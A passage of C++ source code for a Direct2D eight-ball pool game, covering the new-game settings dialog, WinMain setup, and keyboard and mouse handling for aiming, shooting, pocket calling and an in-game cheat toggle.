            GetWindowRect(hwndOwner, &rcOwner);
            GetWindowRect(hDlg, &rcDlg);
            CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

            // Offset the owner rect relative to the screen if it's not the desktop
            if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
                OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
            }


            // Calculate centered position
            int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
            int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

            // Ensure it stays within screen bounds (optional safety)
            x = std::max(static_cast<int>(rcScreen.left), x);
            y = std::max(static_cast<int>(rcScreen.top), y);
            if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
                x = rcScreen.right - (rcDlg.right - rcDlg.left);
            if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
                y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


            // Set the dialog position
            SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

            // --- End Centering Code ---

            // Set initial state based on current global settings (or defaults)
            CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

            CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
                (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

            // Enable/Disable AI group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
            // Set initial state for Opening Break Mode
            CheckRadioButton(hDlg, IDC_RADIO_CPU_BREAK, IDC_RADIO_FLIP_BREAK,
                (openingBreakMode == CPU_BREAK) ? IDC_RADIO_CPU_BREAK : ((openingBreakMode == P1_BREAK) ? IDC_RADIO_P1_BREAK : IDC_RADIO_FLIP_BREAK));
            // Enable/Disable Opening Break group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), gameMode == HUMAN_VS_AI);
        }
        return (INT_PTR)TRUE;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
            case IDC_RADIO_2P:
            case IDC_RADIO_CPU:
            {
                bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
                // Enable/Disable AI group controls based on selection
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
                // Also enable/disable Opening Break Mode group
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), isCPU);
            }
            return (INT_PTR)TRUE;

            case IDOK:
                // Retrieve selected options and store in global variables
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                    gameMode = HUMAN_VS_AI;
                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;

                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU_BREAK) == BST_CHECKED) openingBreakMode = CPU_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_P1_BREAK) == BST_CHECKED) openingBreakMode = P1_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_FLIP_BREAK) == BST_CHECKED) openingBreakMode = FLIP_COIN_BREAK;
                }
                else {
                    gameMode = HUMAN_VS_HUMAN;
                    // openingBreakMode doesn't apply to HvsH, can leave as is or reset
                }
                SaveSettings(); // Save settings when OK is pressed
                EndDialog(hDlg, IDOK); // Close dialog, return IDOK
                return (INT_PTR)TRUE;

            case IDCANCEL: // Handle Cancel or closing the dialog
                // Optionally, could reload settings here if you want cancel to revert to previously saved state
                EndDialog(hDlg, IDCANCEL);
                return (INT_PTR)TRUE;
            }
            break; // End WM_COMMAND
        }
        return (INT_PTR)FALSE; // Default processing
    }

    // --- NEW Helper to Show Dialog ---
    void ShowNewGameDialog(HINSTANCE hInstance) {
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
            // User clicked Start, reset game with new settings
            isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
            if (isPlayer2AI) {
                switch (aiDifficulty) {
                case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
                case MEDIUM: player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
                case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
                }
            }
            else {
                player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
            }
            // Update window title
            std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
            if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
            else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
            SetWindowText(hwndMain, windowTitle.c_str());

            InitGame(); // Re-initialize game logic & board
            InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
        }
        else {
            // User cancelled dialog - maybe just resume game? Or exit?
            // For simplicity, we do nothing, game continues as it was.
            // To exit on cancel from F2, would need more complex state management.
        }
    }

    // --- NEW Reset Game Function ---
    void ResetGame(HINSTANCE hInstance) {
        // Call the helper function to show the dialog and re-init if OK clicked
        ShowNewGameDialog(hInstance);
    }

    // --- WinMain ---
    int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
        if (FAILED(CoInitialize(NULL))) {
            MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
            return -1;
        }

        // --- NEW: Load settings at startup ---
        LoadSettings();

        // --- NEW: Show configuration dialog FIRST ---
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
            // User cancelled the dialog
            CoUninitialize();
            return 0; // Exit gracefully if dialog cancelled
        }
        // Global gameMode and aiDifficulty are now set by the DialogProc

        // Set AI flag based on game mode
        isPlayer2AI = (gameMode == HUMAN_VS_AI);
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
            case MEDIUM:player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
            case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
            }
        }
        else {
            player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
        }
        // --- End of Dialog Logic ---


        WNDCLASS wc = { };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

        if (!RegisterClass(&wc)) {
            MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // --- ACTION 4: Calculate Centered Window Position ---
        const int WINDOW_WIDTH = 1000; // Define desired width
        const int WINDOW_HEIGHT = 700; // Define desired height
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int windowX = (screenWidth - WINDOW_WIDTH) / 2;
        int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

        // --- Change Window Title based on mode ---
        std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

        DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

        hwndMain = CreateWindowEx(
            0, L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/, windowTitle.c_str(), dwStyle,
            windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
            NULL, NULL, hInstance, NULL
        );

        if (!hwndMain) {
            MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // Initialize Direct2D Resources AFTER window creation
        if (FAILED(CreateDeviceResources())) {
            MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        InitGame(); // Initialize game state AFTER resources are ready & mode is set
        Sleep(500); // Allow window to fully initialize before starting the countdown //midi func
        StartMidi(hwndMain, TEXT(""BSQ.MID"")); // Replace with your MIDI filename
        //PlayGameMusic(hwndMain); //midi func

        ShowWindow(hwndMain, nCmdShow);
        UpdateWindow(hwndMain);

        if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
            MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        MSG msg = { };
        // --- Modified Main Loop ---
        // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
        // or gets reset to it via F2. The main loop runs normally once game starts.
        while (GetMessage(&msg, NULL, 0, 0)) {
            // We might need modeless dialog handling here if F2 shows dialog
            // while window is active, but DialogBoxParam is modal.
            // Let's assume F2 hides main window, shows dialog, then restarts game loop.
            // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        KillTimer(hwndMain, ID_TIMER);
        DiscardDeviceResources();
        SaveSettings(); // Save settings on exit
        CoUninitialize();

        return (int)msg.wParam;
    }

    // --- WndProc ---
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Declare cueBall pointer once at the top, used in multiple cases
        // For clarity, often better to declare within each case where needed.
        Ball* cueBall = nullptr; // Initialize to nullptr
        switch (msg) {
        case WM_CREATE:
            // Resources are now created in WinMain after CreateWindowEx
            return 0;

        case WM_PAINT:
            OnPaint();
            // Validate the entire window region after painting
            ValidateRect(hwnd, NULL);
            return 0;

        case WM_SIZE: {
            UINT width = LOWORD(lParam);
            UINT height = HIWORD(lParam);
            OnResize(width, height);
            return 0;
        }

        case WM_TIMER:
            if (wParam == ID_TIMER) {
                GameUpdate(); // Update game logic and physics
                InvalidateRect(hwnd, NULL, FALSE); // Request redraw
            }
            return 0;

            // --- NEW: Handle F2 Key for Reset ---
            // --- MODIFIED: Handle More Keys ---
        case WM_KEYDOWN:
        { // Add scope for variable declarations

            // --- FIX: Get Cue Ball pointer for this scope ---
            cueBall = GetCueBall();
            // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
            // --- End Fix ---

            // Check which player can interact via keyboard (Humans only)
            bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

            // --- F1 / F2 Keys (Always available) ---
            if (wParam == VK_F2) {
                HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
                ResetGame(hInstance); // Call reset function
                return 0; // Indicate key was processed
            }
            else if (wParam == VK_F1) {
                MessageBox(hwnd,
                    L""Direct2D-based StickPool game made in C++ from scratch (4827+ lines of code)\n"" // Update line count if needed {2764+ lines}
                    L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                    L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                    L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                    L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                    L""About This Game"", MB_OK | MB_ICONINFORMATION);
                return 0; // Indicate key was processed
            }

            // Check for 'M' key (uppercase or lowercase)
                // Toggle music with ""M""
            if (wParam == 'M' || wParam == 'm') {
                //static bool isMusicPlaying = false;
                if (isMusicPlaying) {
                    // Stop the music
                    StopMidi();
                    isMusicPlaying = false;
                }
                else {
                    // Build the MIDI file path
                    TCHAR midiPath[MAX_PATH];
                    GetModuleFileName(NULL, midiPath, MAX_PATH);
                    // Keep only the directory part
                    TCHAR* lastBackslash = _tcsrchr(midiPath, '\\');
                    if (lastBackslash != NULL) {
                        *(lastBackslash + 1) = '\0';
                    }
                    // Append the MIDI filename
                    _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID"")); // Adjust filename if needed

                    // Start playing MIDI
                    StartMidi(hwndMain, midiPath);
                    isMusicPlaying = true;
                }
            }


            // --- Player Interaction Keys (Only if allowed) ---
            if (canPlayerControl) {
                // --- Get Shift Key State ---
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
                float powerStep = 0.2f; // Power step (Adjust as needed)

                switch (wParam) {
                case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle -= angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle < 0) cueAngle += 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_RIGHT: // Rotate Cue Stick Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle += angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_UP: // Decrease Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower -= powerStep;
                        if (shotPower < 0.0f) shotPower = 0.0f;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_DOWN: // Increase Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower += powerStep;
                        if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_SPACE: // Trigger Shot
                    if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                    {
                        if (shotPower > 0.15f) { // Use same threshold as mouse
                           // Reset foul flags BEFORE applying shot
                            firstHitBallIdThisShot = -1;
                            cueHitObjectBallThisShot = false;
                            railHitAfterContact = false;

                            // Play sound & Apply Shot
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                            ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                            // Update State
                            currentGameState = SHOT_IN_PROGRESS;
                            foulCommitted = false;
                            pocketedThisTurn.clear();
                            shotPower = 0; // Reset power after shooting
                            isAiming = false; isDraggingStick = false; // Reset aiming flags
                            keyboardAimingActive = false;
                        }
                    }
                    break;

                case VK_ESCAPE: // Cancel Aim/Shot Setup
                    if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                    {
                        shotPower = 0.0f;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = false;
                        // Revert to basic turn state if not breaking
                        if (currentGameState != BREAKING) {
                            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        }
                        //if (currentPlayer == 1) calledPocketP1 = -1;
                        //else                  calledPocketP2 = -1;
                    }
                    break;

                case 'G': // Toggle Cheat Mode
                    cheatModeEnabled = !cheatModeEnabled;
                    if (cheatModeEnabled)
                        MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                    else
                        MessageBeep(MB_OK); // Play a different beep when disabling
                    break;

                default:
                    // Allow default processing for other keys if needed
                    // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
                    break;
                } // End switch(wParam) for player controls
                return 0; // Indicate player control key was processed
            } // End if(canPlayerControl)
        } // End scope for WM_KEYDOWN case
        // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
        // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
        return 0;

        case WM_MOUSEMOVE: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- NEW LOGIC: Handle Pocket Hover ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {
                int oldHover = currentlyHoveredPocket;
                currentlyHoveredPocket = -1; // Reset
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        currentlyHoveredPocket = i;
                        break;
                    }
                }
                if (oldHover != currentlyHoveredPocket) {
                    InvalidateRect(hwnd, NULL, FALSE);
                }
                // Do NOT return 0 here, allow normal mouse angle update to continue
            }
            // --- END NEW LOGIC ---


            cueBall = GetCueBall(); // Declare and get cueBall pointer

            if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
                Ball* ball = GetBallById(draggingBallId);
                if (ball) {
                    ball->x = (float)ptMouse.x;
                    ball->y = (float)ptMouse.y;
                    ball->vx = ball->vy = 0.0f;
                }
                return 0;
            }

            if (!cueBall) return 0;

            // Update Aiming Logic (Check player turn)
            if (isDraggingCueBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                    currentGameState == PRE_BREAK_PLACEMENT))
            {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                // Tentative position update
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0;
            }
            else if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                //NEW2 MOUSEBOUND CODE = START
                    /*// Clamp mouse inside table bounds during aiming
                    if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
                if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
                if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
                if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
                //NEW2 MOUSEBOUND CODE = END
                // Aiming drag updates angle and power
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                    float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                    shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                }
            }
            else if (isSettingEnglish &&
                ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
            {
                // Setting English
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
            }
            else {
                //DISABLE PERM AIMING = START
                /*// Update visual angle even when not aiming/dragging (Check player turn)
                bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                    (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                    currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

                if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
                {
                    // NEW MOUSEBOUND CODE = START
                        // Only update cue angle if mouse is inside the playable table area
                    if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                        ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                    {
                        // NEW MOUSEBOUND CODE = END
                        Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                        if (cb) {
                            float dx = (float)ptMouse.x - cb->x;
                            float dy = (float)ptMouse.y - cb->y;
                            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                        }
                    } //NEW MOUSEBOUND CODE LINE = DISABLE
                }*/
                //DISABLE PERM AIMING = END
            }
            return 0;
        } // End WM_MOUSEMOVE

        case WM_LBUTTONDOWN: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- FOOLPROOF FIX: This block implements the two-stage pocket selection ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // STAGE 1, STEP 1: Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // STAGE 1, STEP 2: Player clicked on a pocket. Update the choice.
                    // We DO NOT change the game state here. This allows re-selection.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and stay in CHOOSING_POCKET state.
                }

                // STAGE 2, STEP 1: Check if the player is clicking the cue ball to confirm.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // STAGE 2, STEP 2: A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to a generic aiming state.
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message.
                    isAiming = true; // Prepare for aiming.
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable.
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }

            /*// --- FOOLPROOF FIX: This block handles re-selectable pocket choice ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) { // Player clicked on a pocket
                    // FIX: Update the called pocket, but DO NOT change the game state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show updated arrow
                    return 0; // Consume the click and stay in CHOOSING_POCKET state
                }

                // FIX: Add new logic to CONFIRM the choice by clicking the cue ball.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to aiming, not PLAYER1_TURN
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }*/

            /*// --- handle pocket re-selection when choosing 8-ball pocket ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1)
                || (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI))
            {
                POINT pt = { LOWORD(lParam), HIWORD(lParam) };
                for (int i = 0; i < 6; ++i) {
                    float dx = pt.x - pocketPositions[i].x;
                    float dy = pt.y - pocketPositions[i].y;
                    if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                        // 1) Record the call
                        if (currentPlayer == 1) calledPocketP1 = i;
                        else                  calledPocketP2 = i;
                        // 2) Clear any prompt text
                        pocketCallMessage.clear();
                        // 3) Return to normal aiming state
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        // 4) Redraw (arrow stays because calledPocketP* >= 0)
                        InvalidateRect(hwnd, NULL, FALSE);
                        return 0; // consume click
                    }
                }
                return 0; // clicked outside ? stay in pocket?call until a valid pocket is chosen
            }*/

            // … rest of your click?to?aim logic …

            //replaced /w new code
            /*
            // --- FIX: Add this entire block at the top of WM_LBUTTONDOWN ---
    // This handles input specifically for the pocket selection state.
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
